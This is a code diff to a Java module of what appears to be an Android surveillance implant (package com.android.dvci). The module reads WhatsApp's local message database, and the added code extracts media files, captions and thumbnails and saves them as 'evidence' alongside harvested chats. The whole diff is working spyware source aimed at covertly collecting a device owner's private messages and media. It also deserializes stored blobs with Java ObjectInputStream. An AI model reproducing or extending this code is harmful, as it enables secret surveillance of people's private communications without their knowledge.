@@ -1,9 +1,14 @@
 package com.android.dvci.module.chat;
 
+import java.io.ByteArrayInputStream;
 import java.io.File;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectStreamClass;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.Formatter;
 import java.util.concurrent.Semaphore;
 
 import javax.xml.parsers.DocumentBuilderFactory;
@@ -22,10 +27,12 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.db.GenericSqliteHelper;
 import com.android.dvci.db.RecordVisitor;
 import com.android.dvci.file.Path;
+import com.android.dvci.module.MessageChatMultimedia;
 import com.android.dvci.module.ModuleAddressBook;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.StringUtils;
 import com.android.mm.M;
+import com.whatsapp.MediaData;
 
 public class ChatWhatsapp extends SubModuleChat {
 	private static final String TAG = "ChatWhatsapp";
@@ -200,8 +207,9 @@ public class ChatWhatsapp extends SubModuleChat {
 					}
 					return;
 				}
+				SQLiteDatabase db = null;
 				try {
-					SQLiteDatabase db = helper.getReadableDatabase();
+					 db = helper.getReadableDatabase();
 
 					// retrieve a list of all the conversation changed from the last
 					// reading. Each conversation contains the peer and the last id
@@ -223,24 +231,35 @@ public class ChatWhatsapp extends SubModuleChat {
 							newLastRead = Math.max(conversationLastRead, newLastRead);
 
 							if (Cfg.DEBUG) {
-								Check.log(TAG + " (readChatMessages): fetchMessages " + conversation
+								Check.log(TAG + " (readChatWhatsappMessages): fetchMessages " + conversation
 										+ " newLastRead " + newLastRead);
 							}
 						}catch(Exception ex){
 							if (Cfg.DEBUG) {
-								Check.log(TAG + " (readChatMessages): fetchMessages " + ex);
+								Check.log(TAG + " (readChatWhatsappMessages): fetchMessages " + ex);
 							}
 						}
 					}
 
 					if (newLastRead > lastWhatsapp) {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " (readChatMessages): updating markup");
+							Check.log(TAG + " (readChatWhatsappMessages): updating markup");
 						}
 						markup.writeMarkupSerializable(newLastRead);
 					}
 				}finally {
 					helper.disposeDb();
+					if(db!=null && db.isOpen()){
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (readChatMessages) closing db pointer");
+						}
+						db.close();
+						db=null;
+					}else{
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (readChatMessages) no need to close db pointer");
+						}
+					}
 				}
 			} else {
 				if (Cfg.DEBUG) {
@@ -340,7 +359,7 @@ public class ChatWhatsapp extends SubModuleChat {
 	 */
 	private long fetchMessages(SQLiteDatabase db, String conversation, long lastWhatsapp) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (fetchMessages): " + conversation + " : " + lastWhatsapp);
+			Check.log(TAG + " (fetchMessages): " + conversation + " : lsw" + lastWhatsapp);
 		}
 
 		String peer = clean(conversation);
@@ -355,33 +374,77 @@ public class ChatWhatsapp extends SubModuleChat {
 		// f.7=data
 		// f_b=timestamp
 		// f_c=key_from_me
-		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("data"), M.e("timestamp"), M.e("key_from_me"),
-				"remote_resource" };
+		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("data"), M.e("timestamp"), M.e("key_from_me"),M.e("remote_resource"),
+				M.e("media_mime_type"), M.e("media_wa_type"), M.e("media_caption"),M.e("thumb_image"), M.e("raw_data"),M.e("media_size")
+		};
+
 
 		// SELECT _id,key_remote_jid,data FROM messages where _id=$conversation
 		// AND key_remote_jid>$lastReadIndex
 		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, M.e("timestamp"));
 
 		ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
+		ArrayList<MessageChatMultimedia> multimedias = new ArrayList<MessageChatMultimedia>();
 		long lastRead = lastWhatsapp;
 		while (cursor != null && cursor.moveToNext()) {
+			boolean is_mm = false;
 			int index = cursor.getInt(0); // f_4
 			String message = cursor.getString(2); // f_7
 			Long timestamp = cursor.getLong(3); // f_b
 			boolean incoming = cursor.getInt(4) != 1; // f_
 			String remote = clean(cursor.getString(5));
+			/* media part */
+			/*
+			 * media_mime_type          TEXT,
+			 * media_wa_type            TEXT,
+			 * media_caption            TEXT,
+			 * thumb_image              TEXT,
+			 * raw_data                 BLOB,
+			 **/
+
+			String mm_wa_type_str = cursor.getString(7);
+			int mm_wa_type = 0;
+			if(mm_wa_type_str != null){
+				try {
+					mm_wa_type = Integer.parseInt(mm_wa_type_str);
+				}catch (Exception e){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (fetchMessages) Error parsingInt: " + mm_wa_type_str +"\n"+ e);
+					}
+					mm_wa_type = 0;
+				}
+			}
+			String mm_mime = "";
+			byte[] mm_serialize_obj = null;
+			byte[] mm_jpeg_thumb = null;
+			int mm_size = 0;
+			String mm_media_caption = "";
+			try {
+				mm_mime = cursor.getString(6);
+				mm_serialize_obj = cursor.getBlob(9);
+				mm_jpeg_thumb = cursor.getBlob(10);
+				mm_media_caption = cursor.getString(8);
+				mm_size = cursor.getInt(11);
+			} catch (Exception e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (fetchMessages) Error getting mm: " + e);
+				}
+			}
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + message);
 			}
 			lastRead = Math.max(timestamp, lastRead);
 
-			if (StringUtils.isEmpty(message)) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (fetchMessages), empty message");
-				}
-				continue;
-
+			/* it can be a multimedia message , don't skip it only for message == empty*/
+			if (StringUtils.isEmpty(message) && (mm_wa_type<1 || mm_wa_type > 4) ) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (fetchMessages), empty message");
+					}
+					continue;
+			}
+			if((mm_wa_type>=1 && mm_wa_type <= 3)){
+				is_mm = true;
 			}
 
 			if (Cfg.DEBUG) {
@@ -407,15 +470,45 @@ public class ChatWhatsapp extends SubModuleChat {
 
 			if (to != null && from != null && message != null) {
 				messages.add(new MessageChat(PROGRAM, new Date(timestamp), from, to, message, incoming));
-			} else {
+			} else if (is_mm && to != null && from != null && mm_serialize_obj != null) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (fetchMessages) Error, null values");
+					Check.log(TAG + " (fetchMessages) multimedia");
 				}
+				try{
+					MediaData wamd = byteToWhatsappMediaData(mm_serialize_obj);
+					if (wamd != null && wamd.getFile()!=null && wamd.getFile().canRead() ) {
+						multimedias.add(new MessageChatMultimedia(PROGRAM, new Date(timestamp), from, to, incoming, mm_media_caption, mm_mime, wamd.getFile(),mm_size));
+						if(mm_media_caption!=null){
+							messages.add(new MessageChat(PROGRAM, new Date(timestamp), from, to, mm_media_caption, incoming));
+						}
+					}else{
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (fetchMessages) skipping malformed multimedia");
+						}
+					}
+				}catch (Exception e){
+					if (Cfg.EXCEPTION) {
+						Check.log(e);
+					}
+
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (fetchMessages) Error: " + e);
+					}
+				}
+
+			} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (fetchMessages) Error, null values");
+					}
 			}
 
 		}
 		cursor.close();
 		getModule().saveEvidence(messages);
+		getModule().saveEvidenceMultimedia(multimedias);
+		messages = null;
+		multimedias = null;
+		System.gc();
 		return lastRead;
 	}
 
@@ -434,5 +527,80 @@ public class ChatWhatsapp extends SubModuleChat {
 		}
 
 	}
+
+	/* Feature: Chat Multimedia
+	 * Description:
+	 *    Extracts from the chat the multimedia files and report an evidence
+	 *    with it's filepath.
+	 *    0xC6C9 => :CHATMM, # chat multimedia
+	 * Fields:
+	 *    struct time
+	 *    program
+	 *    flags
+	 *    to
+	 *    to_display
+	 *    from
+	 *    from_display
+	 *    mime
+	 *    filename
+	 *
+	 * DB analysis:
+	 * Media related fields and index:
+	 * FIELDS:
+	 * media_mime_type = TEXT , example image/jpeg,audio/aac,video/mp4
+	 *  availability only with media
+	 * media_wa_type = INTEGER , example 0=text 1=img, 2=audio 3=video
+	 *  availability always
+	 * media_size = INTEGER
+	 *  availability only with media
+	 * media_name = TEXT
+	 *  availability only with media
+	 * media_hash = TEXT
+	 *  availability only with media , some kind of base64 originated from an unknown
+	 *  hash source
+	 * media_caption = TEXT
+	 *  availability only with media and if inserted
+	 * thumb_image = TEXT serialized obj , byte array
+	 *  availability only with media
+	 * raw_data = BLOB of jpeg
+	 *  availability only with media IMG and VIDEO
+	 *
+	 *  INDEXES:
+	 *  ID                  |FIELD
+	 *  media_type_index    |media_wa_type
+	 *  media_hash_index    |media_hash
+	 */
+
+
+	public MediaData byteToWhatsappMediaData(byte[] bytes) {
+		if (bytes == null)
+			return null;
+		MediaData object = null;
+		try {
+			ObjectInputStream objectInputStream = new ObjectInputStream( new ByteArrayInputStream(bytes) );
+			object = (MediaData)objectInputStream.readObject();
+		} catch (IOException e) {
+			if (Cfg.DEBUG) {
+				Formatter formatter = new Formatter();
+				for (byte b : bytes) {
+					formatter.format("%02x", b);
+				}
+				String hex = formatter.toString();
+				Check.log(TAG + " (stringToWhatsappMediaData) Error: " + hex);
+			}
+			e.printStackTrace();
+		} catch (ClassNotFoundException e) {
+			e.printStackTrace();
+		} catch (ClassCastException e) {
+			e.printStackTrace();
+		}
+		return object;
+	}
+	/*
+		 * deserialized with : https://code.google.com/p/jdeserialize/
+		 * this class is used to deserialize the serialized object in
+		 *
+		 */
+
 
 }
